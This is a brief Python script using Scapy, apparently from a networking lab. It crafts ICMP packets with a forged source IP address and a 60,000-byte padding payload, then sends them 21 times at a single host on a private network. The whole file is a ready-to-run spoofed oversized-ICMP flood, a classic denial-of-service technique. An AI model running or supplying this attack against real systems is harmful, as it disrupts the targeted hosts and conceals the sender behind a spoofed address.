from scapy.all import *
ip1 = IP(src="192.168.0.99", dst ="192.168.0.11")

packet = ip1/ICMP()/("m"*60000)
send(packet)
i=0
while i<20 :
	send(packet)
	i = i+1
